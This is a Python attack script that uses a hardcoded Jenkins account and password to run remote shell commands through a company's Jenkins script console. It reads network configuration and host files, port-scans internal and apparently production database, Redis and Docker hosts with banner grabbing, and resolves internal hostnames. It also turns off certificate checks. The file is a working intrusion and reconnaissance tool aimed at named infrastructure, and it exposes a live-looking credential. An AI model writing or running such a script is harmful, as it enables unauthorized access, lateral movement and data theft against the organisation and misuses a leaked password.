# kimi5_network.py — Jenkins script-console network recon (Claroshop)
# Runs 3 tasks via /scriptText: interfaces/routes, port scan, DNS resolution.
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time, os, sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'
OUT_DIR = os.path.dirname(os.path.abspath(__file__))

def jenkins_exec(script, timeout=300):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=20).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data, headers={
        'Authorization': 'Basic ' + AUTH,
        crumb['crumbRequestField']: crumb['crumb'],
    })
    return opener.open(req2, timeout=timeout).read().decode('utf-8', 'replace')

TASK1 = r'''def r = ["bash","-c","""ip addr show 2>/dev/null || ifconfig
echo '==='
ip route show 2>/dev/null || route -n
echo '==='
cat /etc/hosts
echo '==='
cat /etc/resolv.conf"""].execute().text
println r'''

TASK2 = r'''def r = ["bash","-c","""python -c "
import socket,sys
reload(sys)
targets=[
 ('172.27.140.148',4243,'Docker'),('172.27.140.151',3306,'MySQL-DEV'),
 ('172.27.141.6',3308,'MySQL-Sears'),('172.27.141.15',3306,'MySQL-QA'),
 ('187.191.91.37',3306,'MySQL-PROD'),('3.231.83.29',27017,'MongoDB'),
 ('172.26.84.132',27021,'MongoDB-int'),
 ('172.27.140.1',6379,'Redis?'),('172.27.140.148',6379,'Redis?'),
 ('172.27.141.6',6379,'Redis?'),('172.27.140.151',6379,'Redis?'),
 ('172.27.148.14',3306,'MySQL?'),
 ('172.27.140.148',8080,'HTTP?'),('172.27.140.148',8443,'HTTPS?'),
 ('172.27.140.1',8443,'OCP?'),
]
# Also scan .140.x and .141.x for common services
for last in range(1,20):
 targets.append(('172.27.140.%d'%last,3306,'MySQL-scan'))
 targets.append(('172.27.141.%d'%last,3306,'MySQL-scan'))
 targets.append(('172.27.140.%d'%last,6379,'Redis-scan'))

for host,port,desc in targets:
 try:
  s=socket.socket()
  s.settimeout(1)
  s.connect((host,port))
  banner=''
  try:
   s.settimeout(2)
   banner=repr(s.recv(256)[:80])
  except:pass
  print 'OPEN %s:%d (%s) %s' % (host,port,desc,banner)
  s.close()
 except:
  pass
" 2>&1"""].execute().text
println r'''

TASK3 = r'''def r = ["bash","-c","""python -c "
import socket,sys
reload(sys)
hosts=['appdb.claroshop-services.net','dbasears.mrc-services.io','db-api-claroshop.qa.claroshop-services.io',
'console.dev.amxnova.net','nexus.dev.claroshop.com','jenkins-ng.dev.claroshop.com',
'gitlab.dev.claroshop.com','redis.dev.claroshop.com','mongo.dev.claroshop.com',
'api.claroshop.com','api.sears.com.mx','api-qa.claroshop.com']
for h in hosts:
 try:
  ip=socket.gethostbyname(h)
  print '%s -> %s' % (h,ip)
 except:
  print '%s -> NXDOMAIN' % h
" 2>&1"""].execute().text
println r'''

results = {}
for name, script in [('TASK1_INTERFACES_ROUTES', TASK1), ('TASK2_PORTSCAN', TASK2), ('TASK3_DNS', TASK3)]:
    print('=' * 72)
    print(name)
    print('=' * 72)
    try:
        out = jenkins_exec(script)
    except Exception as e:
        out = 'ERROR: %r' % (e,)
    print(out)
    results[name] = out
    sys.stdout.flush()

ts = time.strftime('%Y%m%d_%H%M%S')
path = os.path.join(OUT_DIR, 'kimi5_network_results_%s.json' % ts)
with open(path, 'w', encoding='utf-8') as f:
    json.dump(results, f, indent=2, ensure_ascii=False)
print('Saved: ' + path)
